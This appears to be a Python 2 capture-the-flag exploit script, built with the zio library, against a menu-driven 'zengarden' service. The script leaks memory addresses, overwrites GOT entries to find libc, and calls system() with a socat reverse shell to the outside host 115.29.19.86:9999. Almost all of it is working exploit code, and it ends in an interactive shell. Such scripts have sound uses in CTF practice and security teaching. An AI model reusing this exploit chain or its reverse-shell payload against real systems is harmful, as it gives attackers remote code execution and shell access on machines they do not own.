#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

io = zio(('pwnbox.ztx.io', 4214), timeout = 1000000, print_read = REPR, print_write = COLORED(REPR))
#io = zio(('10.10.10.133', 4214), timeout = 1000000, print_read = REPR, print_write = COLORED(REPR))
io.read_until('[q]uit?')

def delete_rake():
	io.writeline('d')
	io.read_until('0-4?')
	io.writeline('0')
	io.read_until('[q]uit?')

def add_sign(num, payload):
	io.writeline('a')
	io.read_until('p[e]rson?')
	io.writeline('s')
	io.read_until('0-4?')
	io.writeline(str(num))
	io.read_until('sign:')
	io.writeline(payload)
	io.read_until('[q]uit?')

#add rake
io.writeline('a')
io.read_until('p[e]rson?')
io.writeline('r')
io.read_until('0-4?')
io.writeline('0')
io.read_until('[q]uit?')

delete_rake()

#add  pond
io.writeline('a')
io.read_until('p[e]rson?')
io.writeline('p')
io.read_until('0-4?')
io.writeline('1')
io.read_until('[q]uit?')

#get address
io.writeline('p')
io.read_until('0-4?')
io.writeline('1')
io.read_until('reflection of ')

#io.read_line()
#print io.read_line()

base_addr = int(io.readline(), 16) + 4
log('base_addr:' + hex(base_addr), 'red')
#log('base_addr: 0x%x' % base_addr, 'red')
io.read_until('[q]uit?')

#payload
#sprintf+bss+lsm.got
payload1 = l32(base_addr) + l32(0x08049210) + "A"*108 + l32(0x08049210) + l32(0x0804bc40) + l32(0x0804bbbc) + "A"*0xe4 + l32(0x08049107)
#print payload

delete_rake()

add_sign(2, payload1)

#get libc_addr
io.writeline('p')
io.read_until('0-4?')
io.writeline('1')
io.readline()
#io.readline()
#print io.readline()[0:4]
lsm_addr = l32(io.readline()[0:4])
log('sprintf_addr:' + hex(lsm_addr), 'red')

#system
libc_addr = lsm_addr - 0x198A0
log('libc_addr:' + hex(libc_addr), 'red')

system_addr = libc_addr + 0x3EA70
log('system_addr:' + hex(system_addr), 'red')

#binsh_addr = libc_addr + 0x15FCBF

#payload
#payload2 = l32(base_addr) + l32(system_addr) + l32(binsh_addr)
payload2 = l32(base_addr) + l32(system_addr) + ";socat tcp-connect:115.29.19.86:9999 exec:'bash -li',pty,stderr,setsid,sigint,sane"

delete_rake()

add_sign(3, payload2)

#final
io.writeline('p')
io.read_until('0-4?')
io.writeline('1')
#io.readline()
io.interact()
# io.writeline('cat /home/zengarden/flag;')
